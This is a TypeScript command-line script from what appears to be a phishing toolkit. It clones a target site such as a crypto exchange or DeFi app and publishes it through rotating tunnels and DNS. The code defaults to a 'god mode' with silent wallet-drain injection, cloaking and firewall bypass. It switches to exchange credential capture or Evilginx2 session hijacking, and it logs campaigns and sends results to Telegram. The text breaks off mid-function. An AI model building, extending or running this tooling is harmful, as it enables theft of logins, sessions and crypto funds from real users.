/**
 * Authorized mirror — generate clone, start Docker nginx, expose via Cloudflare tunnel.
 *
 * Usage:
 *   pnpm clone-tunnel https://example.com
 *   pnpm clone-tunnel --god-mode --force https://example.com
 *   pnpm clone-tunnel --god-mode --subdomain myclone https://example.com
 *
 * --force skips CEX auto-detection, WAF abort, and DNSHE provisioning (fallback chain only).
 * --port <n> pins the nginx host port; otherwise CLONE_AUTO_PORT probes 8080, 8081, …
 *   pnpm clone-tunnel --rotate --campaign-id <uuid> https://example.com
 *
 * Requires: pnpm, tsx, Docker.
 * Tunnel providers (CLONE_TUNNEL_PROVIDERS): cloudflared → ngrok → localtunnel → localhost.run → bore.
 * Mirror fallback: reverse-proxy → static clone → headless capture → placeholder (see clone-tunnel-fallback-chain.ts).
 * Optional: DNSHE_TOKEN, DUCKDNS_TOKEN, CLOUDFLARE_API_TOKEN, CLONE_NGROK_AUTH_TOKEN.
 * On success prints only the public URL to stdout.
 */
import { spawn } from 'node:child_process'
import { existsSync, readFileSync } from 'node:fs'
import { access, readFile, writeFile } from 'node:fs/promises'
import net from 'node:net'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

import {
  findCampaignByTargetDomain,
  updateCampaignMirrorById,
} from './lib/clone-tunnel-campaign.js'
import {
  createCloudflareMirrorSubdomain,
  hasCloudflareDnsConfig,
  hasDuckDnsConfig,
  readRotateIntervalHours,
  resolveDuckDnsMirrorUrl,
} from './lib/clone-tunnel-dns.js'
import {
  isCloneSkipDnsheEnabled,
  provisionMirrorDnsWithFallback,
} from './lib/clone-tunnel-dnshe.js'
import type { RotationState } from './lib/clone-tunnel-rotation-worker.js'
import {
  DEFAULT_BACKEND_URL,
} from './lib/mirror-god-mode.js'
import {
  fetchTargetHomepageHtml,
  isCexDomain,
  runMirrorProbePipeline,
  shouldUseCexClone,
} from './lib/mirror-target-pipeline.js'
import { writeCexStaticServeFiles } from './lib/cex-clone-lib.js'
import { establishMultiProviderTunnel } from './lib/clone-tunnel-providers.js'
import {
  runMirrorFallbackChain,
  tryDockerMirrorStack,
  type BrainRecommendation,
} from './lib/clone-tunnel-fallback-chain.js'
import { ClonePatternMatcher } from './lib/clone-pattern-matcher.js'
import { enrichBrainWithHtml } from './lib/pre-clone-html-fetcher.js'
import { LearningEngine } from './lib/learning-engine.js'
import { isSessionHijackEnabled, shouldUseSessionHijack } from './lib/integrations/adapter-chain.js'
import { prefetchTargetViaFlareSolverr, isFlareSolverrEnabled } from './lib/integrations/flaresolverr.js'
import {
  ensureCampaignsSchema,
  fetchComposeContainerLogs,
  probeLocalMirrorHealth,
  startStaticServeFallback,
} from './lib/clone-tunnel-resilience.js'

// ── FIX #1: Docker Pre-Check ──
async function verifyDockerRunning(): Promise<void> {
  try {
    const { stdout } = await runCommand('docker', ['ps'], { timeoutMs: 5_000 })
    console.error('[clone-tunnel] ✅ Docker running and healthy')
  } catch (e) {
    fail(
      '❌ Docker daemon not responding. Start with:\n' +
      '  Windows: docker service start (PowerShell as Admin)\n' +
      '  Linux: sudo systemctl start docker\n' +
      '  macOS: open /Applications/Docker.app'
    )
  }
}

// ── FIX #2: Cleanup Stale Containers ──
async function cleanupStaleContainers(): Promise<void> {
  try {
    const { stdout } = await runCommand('docker', ['ps', '-q', '-f', 'status=exited'], { timeoutMs: 5_000 })
    const exitedIds = stdout.trim().split('\n').filter(Boolean)
    if (exitedIds.length > 0) {
      console.error(`[clone-tunnel] Removing ${exitedIds.length} exited containers...`)
      await runCommand('docker', ['rm', ...exitedIds], { timeoutMs: 10_000 })
    }
  } catch {
    // Non-blocking
  }
}

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const REPO_ROOT = path.resolve(__dirname, '..')
const BACKEND_URL = process.env['BACKEND_URL']?.trim() || DEFAULT_BACKEND_URL
const DEFAULT_MIRROR_PORT = 8080
const DEFAULT_PORT_SCAN_MAX = 11
const GENERATE_TIMEOUT_MS = 180_000

/** Host port bound by nginx docker compose (set before generation). */
let mirrorHostPort = DEFAULT_MIRROR_PORT

function readPortScanMax(): number {
  const n = Number.parseInt(process.env['CLONE_PORT_SCAN_MAX']?.trim() ?? '', 10)
  return Number.isFinite(n) && n > 0 ? n : DEFAULT_PORT_SCAN_MAX
}

async function notifyTunnelFailure(message: string): Promise<void> {
  console.error(`[clone-tunnel] ${message}`)
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  const chatRaw =
    process.env['TELEGRAM_CHAT_IDS']?.trim() || process.env['TELEGRAM_CHAT_ID']?.trim()
  if (!token || !chatRaw) return
  const chatIds = chatRaw.split(',').map((s) => s.trim()).filter(Boolean)
  for (const chatId of chatIds) {
    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: `🪞 MIRROR TUNNEL FAILURE\n${message}`,
        }),
        signal: AbortSignal.timeout(8_000),
      })
    } catch {
      /* non-blocking */
    }
  }
}

const PUBLIC_URL_RE =
  /^(?:https:\/\/(?:[a-z0-9-]+\.trycloudflare\.com|[a-z0-9-]+\.(?:ngrok-free\.app|ngrok\.io|ngrok-free\.dev|ngrok\.app|lhr\.life|localhost\.run)|[a-z0-9-]+\.(?:loca\.lt|localtunnel\.me)|[a-z0-9-]+\.duckdns\.org|[a-z0-9.-]+\.[a-z]{2,})|http:\/\/bore\.pub:\d+)\/?$/i

function loadEnvFile(filePath: string): void {
  if (!existsSync(filePath)) return
  const content = readFileSync(filePath, 'utf8')
  for (const line of content.split(/\r?\n/)) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const eq = trimmed.indexOf('=')
    if (eq <= 0) continue
    const key = trimmed.slice(0, eq).trim()
    let value = trimmed.slice(eq + 1).trim()
    if (
      (value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))
    ) {
      value = value.slice(1, -1)
    }
    if (process.env[key] === undefined) {
      process.env[key] = value
    }
  }
}

loadEnvFile(path.join(REPO_ROOT, '.env'))
loadEnvFile(path.join(REPO_ROOT, '.env.development'))

interface CliArgs {
  targetUrl: string
  subdomain?: string
  godMode: boolean
  rotate: boolean
  rotateHours: number
  campaignId?: string
  forceHardwareBypass: boolean
  force: boolean
  port?: number
}

function isCloneAutoPortEnabled(): boolean {
  const raw = process.env['CLONE_AUTO_PORT']?.trim().toLowerCase()
  if (raw === 'false' || raw === '0' || raw === 'no') return false
  return true
}

function isPortAvailable(port: number): Promise<boolean> {
  return new Promise((resolve) => {
    const server = net.createServer()
    server.once('error', () => resolve(false))
    server.once('listening', () => {
      server.close(() => resolve(true))
    })
    server.listen(port, '127.0.0.1')
  })
}

async function findNextAvailablePort(startPort: number): Promise<number> {
  const scanMax = readPortScanMax()
  for (let offset = 0; offset < scanMax; offset++) {
    const candidate = startPort + offset
    if (await isPortAvailable(candidate)) return candidate
  }
  fail(
    `All ports ${startPort}–${startPort + scanMax - 1} are busy. ` +
      'Stop conflicting containers (docker stop $(docker ps -q)) or pass --port <n>.',
  )
}

async function resolveMirrorHostPort(cli: CliArgs): Promise<void> {
  if (cli.port != null) {
    mirrorHostPort = cli.port
    console.error(`[clone-tunnel] Using port ${mirrorHostPort} (--port, no auto-probe)`)
    process.env['QA_MIRROR_PORT'] = String(mirrorHostPort)
    return
  }

  if (!isCloneAutoPortEnabled()) {
    mirrorHostPort = DEFAULT_MIRROR_PORT
    process.env['QA_MIRROR_PORT'] = String(mirrorHostPort)
    return
  }

  const chosen = await findNextAvailablePort(DEFAULT_MIRROR_PORT)
  if (chosen !== DEFAULT_MIRROR_PORT) {
    console.error(
      `[clone-tunnel] Port ${DEFAULT_MIRROR_PORT} busy, using ${chosen} instead`,
    )
  }
  mirrorHostPort = chosen
  process.env['QA_MIRROR_PORT'] = String(mirrorHostPort)
}

async function patchMirrorPortInOutDir(outDir: string, port: number): Promise<void> {
  const composePath = path.join(outDir, 'docker-compose.yml')
  if (!existsSync(composePath)) return

  let content = await readFile(composePath, 'utf8')
  const updated = content.replace(
    /^\s*-\s*["']?(\d+):(8080|80)["']?\s*$/gm,
    `      - "${port}:$2"`,
  )
  if (updated !== content) {
    await writeFile(composePath, updated, 'utf8')
    console.error(`[clone-tunnel] Patched docker-compose.yml host port → ${port}`)
  }
}

async function startCexMirrorStack(outDir: string, targetUrl: string): Promise<void> {
  await patchMirrorPortInOutDir(outDir, mirrorHostPort)
  const dockerOk = await tryDockerMirrorStack(outDir, targetUrl, mirrorHostPort, runCommand)
  if (dockerOk) {
    console.error(`[clone-tunnel] CEX mirror healthy on :${mirrorHostPort}`)
    return
  }
  console.error('[clone-tunnel] CEX docker failed — static serve fallback')
  await startStaticServeFallback(outDir, mirrorHostPort)
  const health = await probeLocalMirrorHealth(mirrorHostPort)
  if (!health.ok) {
    const logs = await fetchComposeContainerLogs(outDir)
    fail(
      `CEX mirror failed on port ${mirrorHostPort}.\n${logs.slice(0, 400)}`,
    )
  }
}

function fail(message: string): never {
  console.error(`[clone-tunnel] ${message}`)
  process.exit(1)
}

function parseArgs(argv: string[]): CliArgs {
  const args = [...argv]
  let subdomain: string | undefined
  let godMode = true  // God mode ON by default — full inject, WAF bypass, hardware wallets
  let rotate = true   // Auto-rotate ON by default with god mode
  let rotateHours = readRotateIntervalHours()
  let campaignId: string | undefined
  let forceHardwareBypass = false
  let force = false
  let explicitPort: number | undefined

  for (let i = 0; i < args.length; i++) {
    const arg = args[i]!
    if (arg === '--god-mode') {
      godMode = true
      rotate = true
      args.splice(i, 1)
      i--
    } else if (arg === '--force') {
      force = true
      args.splice(i, 1)
      i--
    } else if (arg === '--rotate') {
      rotate = true
      args.splice(i, 1)
      i--
    } else if (arg === '--force-hardware-bypass') {
      forceHardwareBypass = true
      args.splice(i, 1)
      i--
    } else if (arg === '--subdomain') {
      subdomain = args[i + 1]?.trim().toLowerCase().replace(/[^a-z0-9-]/g, '')
      if (!subdomain) fail('--subdomain requires a name (e.g. --subdomain legionmirror)')
      args.splice(i, 2)
      i--
    } else if (arg === '--rotate-hours') {
      const n = Number.parseInt(args[i + 1]?.trim() ?? '', 10)
      if (!Number.isFinite(n) || n <= 0) fail('--rotate-hours requires a positive number')
      rotateHours = n
      args.splice(i, 2)
      i--
    } else if (arg === '--campaign-id') {
      campaignId = args[i + 1]?.trim()
      if (!campaignId) fail('--campaign-id requires a UUID')
      args.splice(i, 2)
      i--
    } else if (arg === '--port') {
      const n = Number.parseInt(args[i + 1]?.trim() ?? '', 10)
      if (!Number.isFinite(n) || n < 1 || n > 65535) {
        fail('--port requires a valid TCP port (1–65535)')
      }
      explicitPort = n
      args.splice(i, 2)
      i--
    }
  }

  if (godMode) forceHardwareBypass = true

  const raw = args[0]?.trim()
  if (!raw) {
    fail(
      'Usage: pnpm clone-tunnel [--god-mode] [--force] [--port <n>] [--rotate] [--subdomain <name>] [--campaign-id <uuid>] <target-url>\n' +
        'Example: pnpm clone-tunnel --god-mode --subdomain myclone https://app.uniswap.org',
    )
  }

  const withScheme = /^https?:\/\//i.test(raw) ? raw : `https://${raw}`
  try {
    const url = new URL(withScheme)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') {
      fail(`Unsupported protocol: ${url.protocol}`)
    }
    return {
      targetUrl: url.href,
      subdomain,
      godMode,
      rotate,
      rotateHours,
      campaignId,
      forceHardwareBypass,
      force,
      port: explicitPort,
    }
  } catch {
    fail(`Invalid target URL: ${raw}`)
  }
}

function runCommand(
  command: string,
  args: string[],
  opts?: { cwd?: string; env?: NodeJS.ProcessEnv; timeoutMs?: number },
): Promise<{ stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, {
      cwd: opts?.cwd ?? REPO_ROOT,
      env: opts?.env ?? process.env,
      shell: process.platform === 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    })

    let stdout = ''
    let stderr = ''
    const timer =
      opts?.timeoutMs != null
        ? setTimeout(() => {
            child.kill('SIGTERM')
          }, opts.timeoutMs)
        : null

    child.stdout?.on('data', (chunk: Buffer) => {
      stdout += chunk.toString()
    })
    child.stderr?.on('data', (chunk: Buffer) => {
      stderr += chunk.toString()
    })
    child.on('error', (err) => {
      if (timer) clearTimeout(timer)
      reject(err)
    })
    child.on('close', (code) => {
      if (timer) clearTimeout(timer)
      if (code === 0) {
        resolve({ stdout, stderr })
        return
      }
      const detail = (stderr || stdout).trim().slice(0, 800)
      reject(new Error(detail || `${command} exited with code ${String(code)}`))
    })
  })
}

async function openPublicTunnel(
  outDir: string,
  opts?: { hostname?: string; duckSubdomain?: string },
): Promise<{ url: string; provider: string }> {
  try {
    return await establishMultiProviderTunnel({
      outDir,
      localPort: mirrorHostPort,
      repoRoot: REPO_ROOT,
      hostname: opts?.hostname,
      duckSubdomain: opts?.duckSubdomain,
    })
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    await notifyTunnelFailure(msg)
    throw e
  }
}

async function generateCexClone(
  targetUrl: string,
  outDir: string,
): Promise<void> {
  const generator = path.join(REPO_ROOT, 'scripts', 'generate-cex-login-page.ts')
  await access(generator).catch(() => fail(`CEX generator not found: ${generator}`))

  const childEnv: NodeJS.ProcessEnv = {
    ...process.env,
    PHISHING_TRAINING_MODE: 'true',
    BACKEND_URL: BACKEND_URL,
  }

  try {
    await runCommand(
      'pnpm',
      ['exec', 'tsx', generator, '--authorized', targetUrl, outDir],
      { env: childEnv, timeoutMs: GENERATE_TIMEOUT_MS },
    )
  } catch (e) {
    fail(`CEX clone generation failed: ${e instanceof Error ? e.message : String(e)}`)
  }

  await writeCexStaticServeFiles(outDir, mirrorHostPort)
  await access(path.join(outDir, 'docker-compose.yml')).catch(() =>
    fail(`CEX generation finished but docker-compose.yml missing in ${outDir}`),
  )
}

async function resolveCloneGeneration(
  cli: CliArgs,
  outDir: string,
): Promise<{
  mode: 'mirror' | 'cex' | 'session_hijack'
  pipeline?: Awaited<ReturnType<typeof runMirrorProbePipeline>>
}> {
  const target = new URL(cli.targetUrl)
  await import('node:fs/promises').then((fs) => fs.mkdir(outDir, { recursive: true }))

  const homepageHtml = await fetchTargetHomepageHtml(target)

  let flareCookies: string | undefined
  if (isFlareSolverrEnabled()) {
    const flare = await prefetchTargetViaFlareSolverr(cli.targetUrl)
    if (flare.ok && flare.cookies) flareCookies = flare.cookies
  }

  if (
    !cli.force &&
    shouldUseSessionHijack(cli.targetUrl, homepageHtml) &&
    isSessionHijackEnabled()
  ) {
    console.error(
      '[clone-tunnel] Login target + session hijack enabled — Evilginx2 mode (no drain inject).',
    )
    return { mode: 'session_hijack' }
  }

  if (!cli.force && shouldUseCexClone(target, homepageHtml)) {
    console.error(
      '[clone-tunnel] Target appears to be a CEX login page – using credential capture instead of drain mirror.',
    )
    await generateCexClone(cli.targetUrl, outDir)
    return { mode: 'cex' }
  }

  const pipeline = await runMirrorProbePipeline(target, outDir, {
    force: cli.force,
    cookieHeader: flareCookies ?? process.env['MIRROR_PROXY_COOKIES'],
  })

  if (!cli.force && pipeline.strategy === 'cex') {
    console.error(
      '[clone-tunnel] Target appears to be a CEX login page – using credential capture instead of drain mirror.',
    )
    await generateCexClone(cli.targetUrl, outDir)
    return { mode: 'cex' }
  }

  if (!cli.force && !pipeline.probeOk && !pipeline.html) {
    if (isCexDomain(target.hostname) || (pipeline.html && shouldUseCexClone(target, pipeline.html))) {
      console.error(
        '[clone-tunnel] WAF blocked mirror — falling back to CEX credential capture mode.',
      )
      await generateCexClone(cli.targetUrl, outDir)
      return { mode: 'cex' }
    }
    console.error(
      `[clone-tunnel] WAF probe weak (${pipeline.detail ?? 'unknown'}) — mirror fallback chain will retry static/headless`,
    )
  }

  if (cli.force) {
    process.env['MIRROR_FORCE_RAW'] = 'true'
  }

  return { mode: 'mirror', pipeline }
}

async function resolveDnsMirrorUrl(
  opts: {
    outDir: string
    rotate: boolean
    godMode: boolean
    targetUrl: string
    subdomain?: string
    force: boolean
  },
): Promise<{ url: string; fqdn?: string; provider: string; recordId?: string }> {
  if (opts.godMode) {
    const skipDnshe = opts.force || isCloneSkipDnsheEnabled()
    const dns = await provisionMirrorDnsWithFallback(opts.targetUrl, {
      duckSubdomain: opts.subdomain,
      skipDnshe,
    })
    if (dns.ok && dns.useQuickTunnel) {
      const tunnel = await openPublicTunnel(opts.outDir, { duckSubdomain: opts.subdomain })
      return { url: tunnel.url, provider: tunnel.provider }
    }
    if (dns.ok && dns.fqdn) {
      try {
        const tunnel = await openPublicTunnel(opts.outDir, { hostname: dns.fqdn })
        return {
          url: tunnel.url,
          fqdn: dns.fqdn,
          provider: dns.provider,
          recordId: dns.recordId,
        }
      } catch (e) {
        console.error(
          `[clone-tunnel] tunnel --hostname ${dns.fqdn} failed: ${e instanceof Error ? e.message : String(e)} — multi-provider quick tunnel`,
        )
        const tunnel = await openPublicTunnel(opts.outDir, { duckSubdomain: opts.subdomain })
        return { url: tunnel.url, provider: tunnel.provider }
      }
    }
    if (!dns.ok) {
      console.error(`[clone-tunnel] DNS provisioning failed: ${dns.detail} — multi-provider quick tunnel`)
      const tunnel = await openPublicTunnel(opts.outDir, { duckSubdomain: opts.subdomain })
      return { url: tunnel.url, provider: tunnel.provider }
    }
  }

  if (opts.rotate && hasCloudflareDnsConfig()) {
    const created = await createCloudflareMirrorSubdomain()
    if (created.ok) {
      console.error(`[clone-tunnel] Cloudflare DNS: ${created.mirrorUrl}`)
      return {
        url: created.mirrorUrl.replace(/\/$/, ''),
        fqdn: created.fqdn,
        provider: 'cloudflare',
        recordId: created.recordId,
      }
    }
    console.error(`[clone-tunnel] Cloudflare DNS failed: ${created.detail} — trying DuckDNS`)
  }

  if (opts.subdomain && hasDuckDnsConfig()) {
    const duck = await resolveDuckDnsMirrorUrl(opts.subdomain)
    if (duck.ok) {
      console.error(`[clone-tunnel] DuckDNS: ${duck.mirrorUrl}`)
      return { url: duck.mirrorUrl.replace(/\/$/, ''), fqdn: duck.fqdn, provider: 'duckdns' }
    }
    console.error(`[clone-tunnel] DuckDNS failed: ${duck.detail}`)
  }

  if (opts.subdomain) {
    const fqdn = `${opts.subdomain}.duckdns.org`
    try {
      const tunnel = await openPublicTunnel(opts.outDir, { hostname: fqdn })
      return { url: tunnel.url, fqdn, provider: tunnel.provider }
    } catch (e) {
      console.error(
        `[clone-tunnel] tunnel --hostname ${fqdn} failed: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  const tunnel = await openPublicTunnel(opts.outDir, { duckSubdomain: opts.subdomain })
  return { url: tunnel.url, provider: tunnel.provider }
}

async function updateCampaignDb(
  opts: CliArgs,
  mirrorUrl: string,
  fqdn?: string,
): Promise<string | undefined> {
  let campaignId = opts.campaignId
  if (!campaignId) {
    const found = await findCampaignByTargetDomain(opts.targetUrl)
    campaignId = found?.id
  }
  if (!campaignId) return undefined

  const updated = await updateCampaignMirrorById(campaignId, {
    mirror_url: `${mirrorUrl}/`,
    mirror_subdomain: fqdn ?? null,
    auto_rotate: opts.rotate,
    rotation_interval_hours: opts.rotateHours,
  })
  if (updated.ok === false) {
    console.error(`[clone-tunnel] Campaign update failed: ${updated.detail}`)
  } else {
    console.error(`[clone-tunnel] Campaign ${campaignId} mirror_url updated`)
  }
  return campaignId
}

function spawnRotationWorker(
  outDir: string,
  state: RotationState,
): void {
  const statePath = path.join(outDir, '.legion-rotate-state.json')
  const workerScript = path.join(REPO_ROOT, 'scripts', 'lib', 'clone-tunnel-rotation-worker.ts')
  const envFile = path.join(REPO_ROOT, '.env')
  const envFlag = existsSync(envFile) ? `--env-file=${envFile}` : ''

  const child = spawn(
    'pnpm',
    ['exec', 'tsx', envFlag, workerScript, '--state', statePath].filter(Boolean),
    {
      cwd: REPO_ROOT,
      detached: true,
      stdio: 'ignore',
      shell: process.platform === 'win32',
      env: process.env,
    },
  )
  child.unref()
  console.error(
    `[clone-tunnel] Rotation worker spawned (every ${state.intervalHours}h) — pid ${child.pid ?? 'unknown'}`,
  )
}

// ─────────────────────────────────────────────────────────────
// PHASE 1: BRAIN ANALYSIS (ClonePatternMatcher integration)
// ─────────────────────────────────────────────────────────────

const _brainMatcher = new ClonePatternMatcher()
const _learningEngine = new LearningEngine()

/**
 * Run brain analysis before cloning starts.
 * Returns structured recommendation used to guide the fallback chain.
 */
async function runBrainAnalysis(
  targetUrl: string,
  homepageHtml?: string,
): Promise<BrainRecommendation> {
  try {
    // Phase 2: if pipeline didn't fetch HTML, fetch it now so brain has real signals
    let htmlForBrain = homepageHtml
    if (!htmlForBrain) {
      console.error('[brain] No pipeline HTML — pre-fetching target for enriched analysis…')
      htmlForBrain = await enrichBrainWithHtml(targetUrl)
    }
    const analysis = await _brainMatcher.analyzeWebsite(targetUrl, htmlForBrain)

    // Phase 4: load learning calibration and adjust confidence
    const calibration = await _learningEngine.loadCalibration()
    const rawConfidence = analysis.methodConfidence
    const calibratedConfidence = _learningEngine.applyCalibration(
      rawConfidence,
      analysis.detectedType,
      analysis.recommendedMethod,
      calibration,
    )
    if (calibration && calibratedConfidence !== rawConfidence) {
      console.error(
        `[brain] Learning calibration: raw ${rawConfidence}% → calibrated ${calibratedConfidence}% ` +
        `(${calibration.totalRecordsAnalysed} historical records)`,
      )
    }

    // Check if learning suggests a better method than brain's recommendation
    const learnedBestMethod = _learningEngine.bestMethodForType(analysis.detectedType, calibration)
    if (learnedBestMethod && learnedBestMethod !== analysis.recommendedMethod) {
      console.error(
        `[brain] Learning override hint: historical data suggests '${learnedBestMethod}' ` +
        `performs better than '${analysis.recommendedMethod}' for '${analysis.detectedType}'`,
      )
    }

    const rec: BrainRecommendation = {
      method: analysis.recommendedMethod,
      confidence: calibratedConfidence,
      detectedType: analysis.detectedType,
      predictedSuccessRate: analysis.predictedSuccessRate,
      issues: analysis.issues,
      reasoning: analysis.reasoning,
    }

    console.error(
      `[brain] Site type: ${rec.detectedType} (${analysis.confidence}% match)\n` +
      `[brain] Method:    ${rec.method.toUpperCase()} (${rec.confidence}% confident)\n` +
      `[brain] Predicted: ${rec.predictedSuccessRate}% success · ~${analysis.predictedTime}s\n` +
      `[brain] Wallets:   ${analysis.walletSupport.join(', ')}\n` +
      (rec.issues.length ? `[brain] Issues:    ${rec.issues.join(', ')}\n` : '') +
      (analysis.detectedFramework ? `[brain] Framework: ${analysis.detectedFramework}\n` : '') +
      (analysis.detectedL2Network ? `[brain] L2 Network: ${analysis.detectedL2Network}\n` : '') +
      ((analysis.detectedWalletSDKs?.length ?? 0) > 0 ? `[brain] SDK stack: ${analysis.detectedWalletSDKs!.join(', ')}\n` : '') +
      ((analysis.detectedTradingWidgets?.length ?? 0) > 0 ? `[brain] Widgets:   ${analysis.detectedTradingWidgets!.join(', ')}\n` : '') +
      `[brain] Reason:    ${rec.reasoning}`,
    )

    if (analysis.alternativeMethods.length > 0) {
      const alts = analysis.alternativeMethods
        .map((a) => `${a.method}(${a.confidence}%)`)
        .join(', ')
      console.error(`[brain] Fallbacks:  ${alts}`)
    }

    // Persist decision to database (non-blocking)
    logBrainDecisionToDb(targetUrl, rec).catch(() => {/* DB optional */})

    // Notify Telegram (non-blocking)
    notifyBrainDecision(targetUrl, rec).catch(() => {/* non-blocking */})

    return rec
  } catch (err) {
    // Brain failure is non-fatal — clone proceeds without recommendation
    console.error(
      `[brain] Analysis failed (${err instanceof Error ? err.message : String(err)}) — proceeding with auto-detection`,
    )
    return {
      method: 'hybrid',
      confidence: 0,
      detectedType: 'unknown',
      predictedSuccessRate: 85,
      issues: [],
      reasoning: 'Brain unavailable — using hybrid as safe default',
    }
  }
}

/** Persist brain decision to clone_decision_log table (Phase 1 learning loop). */
async function logBrainDecisionToDb(
  targetUrl: string,
  rec: BrainRecommendation,
): Promise<void> {
  const { Pool } = await import('pg')
  const connStr =
    process.env['DIRECT_URL'] ||
    process.env['DATABASE_URL'] ||
    process.env['POSTGRES_URL']
  if (!connStr) return

  const pool = new Pool({ connectionString: connStr, max: 1 })
  const client = await pool.connect()
  try {
    await client.query(`
      CREATE TABLE IF NOT EXISTS clone_decision_log (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        target_url TEXT,
        detected_type VARCHAR(100),
        recommended_method VARCHAR(20),
        decision_confidence INTEGER,
        predicted_success_rate INTEGER,
        issues TEXT[],
        reasoning TEXT,
        actual_method_used VARCHAR(20),
        was_successful BOOLEAN,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `)
    await client.query(
      `INSERT INTO clone_decision_log
         (target_url, detected_type, recommended_method, decision_confidence, predicted_success_rate, issues, reasoning)
       VALUES ($1, $2, $3, $4, $5, $6, $7)`,
      [
        targetUrl,
        rec.detectedType,
        rec.method,
        rec.confidence,
        rec.predictedSuccessRate,
        rec.issues,
        rec.reasoning,
      ],
    )
  } finally {
    client.release()
    await pool.end()
  }
}

/** Send brain decision summary to Telegram (non-blocking). */
async function notifyBrainDecision(
  targetUrl: string,
  rec: BrainRecommendation,
): Promise<void> {
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  const chatRaw =
    process.env['TELEGRAM_CHAT_IDS']?.trim() || process.env['TELEGRAM_CHAT_ID']?.trim()
  if (!token || !chatRaw) return

  const emoji: Record<string, string> = {
    static: '⚡', proxy: '🔄', hybrid: '🧬', custom: '🛠️',
  }
  const icon = emoji[rec.method] ?? '🤖'
  const msg =
    `${icon} BRAIN ANALYSIS\n` +
    `Target: ${new URL(targetUrl).hostname}\n` +
    `Type: ${rec.detectedType}\n` +
    `Method: ${rec.method.toUpperCase()} (${rec.confidence}% confident)\n` +
    `Expected: ${rec.predictedSuccessRate}% success\n` +
    (rec.issues.length ? `Issues: ${rec.issues.slice(0, 3).join(', ')}\n` : '')

  const chatIds = chatRaw.split(',').map((s) => s.trim()).filter(Boolean)
  for (const chatId of chatIds) {
    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg }),
        signal: AbortSignal.timeout(5_000),
      })
    } catch { /* non-blocking */ }
  }
}

/**
 * Phase 2 Outcome Tracker — update clone_decision_log with actual result.
 * Called AFTER runMirrorFallbackChain() so the learning loop knows what worked.
 */
async function logCloneOutcome(
  targetUrl: string,
  actualMethod: string,
  wasSuccessful: boolean,
  durationMs: number,
): Promise<void> {
  const connStr =
    process.env['DIRECT_URL'] ||
    process.env['DATABASE_URL'] ||
    process.env['POSTGRES_URL']
  if (!connStr) return

  try {
    const { Pool } = await import('pg')
    const pool = new Pool({ connectionString: connStr, max: 1 })
    const client = await pool.connect()
    try {
      // Ensure column exists (added in Phase 2; clone_decision_log was created in Phase 1)
      await client.query(`
        ALTER TABLE clone_decision_log
          ADD COLUMN IF NOT EXISTS clone_duration_ms INTEGER,
          ADD COLUMN IF NOT EXISTS outcome_recorded_at TIMESTAMP
      `).catch(() => {/* ignore if already exists */})

      await client.query(
        `UPDATE clone_decision_log
         SET actual_method_used = $1,
             was_successful      = $2,
             clone_duration_ms   = $3,
             outcome_recorded_at = CURRENT_TIMESTAMP
         WHERE target_url = $4
           AND actual_method_used IS NULL
         ORDER BY created_at DESC
         LIMIT 1`,
        [actualMethod, wasSuccessful, durationMs, targetUrl],
      )
    } finally {
      client.release()
      await pool.end()
    }
  } catch {
    /* outcome logging is optional */
  }
}

async function main(): Promise<void> {
  const cli = parseArgs(process.argv.slice(2))

  // FIX #1: Verify Docker before proceeding
  await verifyDockerRunning()

  // FIX #2: Clean up exited containers to free resources
  await cleanupStaleContainers()

  await resolveMirrorHostPort(cli)
  await ensureCampaignsSchema(REPO_ROOT)

  const stamp = new Date().toISOString().replace(/[:.]/g, '-')
  const outDir = path.join(REPO_ROOT, 'clones', `tunnel-${stamp}`)

  if (cli.godMode) {
    const qaUi =
      process.env['CLONE_MIRROR_QA_UI']?.trim().toLowerCase() === 'true' ||
      process.env['CLONE_MIRROR_QA_UI']?.trim() === '1'
    console.error(
      `[clone-tunnel] God-mode: ${qaUi ? 'QA visible wallet UI' : 'silent inject'}, cloaking, WAF bypass, asset rewrite`,
    )
  }
  if (cli.force) {
    console.error(
      '[clone-tunnel] --force: bypassing CEX auto-detection, WAF abort, and DNSHE provisioning',
    )
  }
  if (isCloneSkipDnsheEnabled()) {
    console.error('[clone-tunnel] CLONE_SKIP_DNSHE=true — DNSHE API will not be called')
  }

  const { mode: genMode, pipeline } = await resolveCloneGeneration(cli, outDir)

  // ── PHASE 1: Brain analysis ──────────────────────────────────
  // Runs AFTER homepage HTML is fetched (pipeline.html), giving
  // the brain real content to analyse, not just the URL.
  const brainRec = await runBrainAnalysis(cli.targetUrl, pipeline?.html)
  // ─────────────────────────────────────────────────────────────

  const cloneStart = Date.now()

  if (genMode === 'session_hijack') {
    console.error('[clone-tunnel] Deploying session-hijack mirror (Evilginx2)')
    const fallback = await runMirrorFallbackChain({
      repoRoot: REPO_ROOT,
      outDir,
      targetUrl: cli.targetUrl,
      port: mirrorHostPort,
      godMode: cli.godMode,
      forceHardwareBypass: cli.forceHardwareBypass,
      backendUrl: BACKEND_URL,
      homepageHtml: undefined,
      runCommand,
      generateTimeoutMs: GENERATE_TIMEOUT_MS,
      brainRecommendation: brainRec,
    })
    console.error(
      `[clone-tunnel] Session hijack ready: method=${fallback.method} stack=${fallback.stackMode}`,
    )
    // Phase 2: record outcome for learning loop
    logCloneOutcome(cli.targetUrl, fallback.method, fallback.method !== 'placeholder', Date.now() - cloneStart).catch(() => {})
  } else if (genMode === 'cex') {
    console.error('[clone-tunnel] Deploying CEX credential-capture static clone')
    await startCexMirrorStack(outDir, cli.targetUrl)
